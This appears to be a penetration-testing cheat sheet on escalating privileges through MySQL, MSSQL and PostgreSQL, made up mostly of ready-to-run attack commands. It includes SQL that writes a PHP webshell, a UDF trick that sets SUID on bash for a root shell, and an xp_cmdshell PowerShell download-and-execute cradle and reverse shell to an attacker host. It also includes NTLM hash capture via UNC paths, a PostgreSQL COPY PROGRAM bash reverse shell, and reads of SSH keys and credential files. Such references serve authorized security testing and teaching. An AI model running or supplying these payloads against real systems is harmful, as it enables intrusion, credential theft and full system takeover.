# 🗄️ Database Privilege Escalation

> **Database services running as privileged users can be leveraged for system-level access.**

---

## Table of Contents
- [MySQL / MariaDB](#mysql--mariadb)
- [MSSQL (SQL Server)](#mssql-sql-server)
- [PostgreSQL](#postgresql)

---

## MySQL / MariaDB

### Running as Root Check

```bash
ps aux | grep mysql   # Does MySQL run as root?
# If yes — any MySQL command execution = root on OS
```

### File Read / Write

- [ ] **Read system files** (requires FILE privilege):
  ```sql
  SELECT LOAD_FILE('/etc/passwd');
  SELECT LOAD_FILE('/root/.ssh/id_rsa');
  SELECT LOAD_FILE('/var/www/html/config.php');
  ```
- [ ] **Write webshell** (requires FILE + writable web dir):
  ```sql
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
  ```

### User-Defined Functions (UDF) — RCE

If MySQL runs as root and you can write to the plugin directory:

```bash
# Step 1: Find plugin directory
mysql -u root -e "SELECT @@plugin_dir;"

# Step 2: Upload UDF shared library (from sqlmap or raptor_udf2)
# lib_mysqludf_sys.so → transfer to plugin dir

# Step 3: Create the function
mysql -u root
```

```sql
USE mysql;
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('chmod +s /bin/bash');
exit;
```

```bash
/bin/bash -p   # → root shell
```

### Credentials in MySQL

```sql
SELECT User, Host, authentication_string FROM mysql.user;  -- MySQL 5.7+
SELECT User, Host, Password FROM mysql.user;               -- MySQL < 5.7
```

### MySQL Credential Files

```bash
cat /etc/mysql/my.cnf
cat /root/.my.cnf            # Often has root credentials!
cat /home/*/.my.cnf
```

---

## MSSQL (SQL Server)

### Enable xp_cmdshell (OS Command Execution)

- [ ] **Enable via sa or sysadmin account**:
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```
- [ ] **Execute commands**:
  ```sql
  EXEC xp_cmdshell 'whoami';
  EXEC xp_cmdshell 'net user';
  EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<attacker>/shell.ps1\")"';
  ```
- [ ] **Reverse shell via xp_cmdshell**:
  ```sql
  EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"<attacker>\",4444);..."';
  ```

### UNC Path / NTLM Hash Capture

```sql
-- Triggers NTLM auth to attacker (run Responder first)
EXEC xp_dirtree '\\<attacker_ip>\share';
EXEC xp_fileexist '\\<attacker_ip>\share\file';
```

### MSSQL Linked Servers

```sql
-- Find linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<linked_server>];

-- Crawl trust chain
SELECT * FROM openquery([<linked_server>], 'SELECT @@servername, @@version');
```

### MSSQL Impersonation

```sql
-- Find users you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;   -- Should show 'sa'
```

---

## PostgreSQL

### COPY PROGRAM — RCE (PostgreSQL 9.3+)

- [ ] **Execute commands via COPY**:
  ```sql
  -- Create table for output
  DROP TABLE IF EXISTS cmd_output;
  CREATE TABLE cmd_output (line text);
  
  -- Execute command
  COPY cmd_output FROM PROGRAM 'id';
  SELECT * FROM cmd_output;
  
  -- Reverse shell
  COPY cmd_output FROM PROGRAM 'bash -i >& /dev/tcp/<attacker>/4444 0>&1';
  ```

### Large Object File Read / Write

```sql
-- Read file
SELECT lo_import('/etc/passwd');          -- imports as large object
SELECT lo_get(<oid>);                     -- retrieve it

-- Write file
SELECT lo_import('/etc/passwd', 1337);
SELECT lo_export(1337, '/tmp/passwd_copy');
```

### PostgreSQL Credentials

```bash
cat /etc/postgresql/*/main/pg_hba.conf    # Authentication config
cat /var/lib/postgresql/.psql_history     # Command history (may have passwords!)
find / -name ".pgpass" 2>/dev/null        # Password file
```

---

## 🔗 References

- [HackTricks — MySQL Injection](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
- [HackTricks — MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [HackTricks — PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

---

*[← Windows PrivEsc](./02_windows_privesc.md) · [PrivEsc Hub](./README.md) · [Active Directory →](../08_active_directory/README.md)*
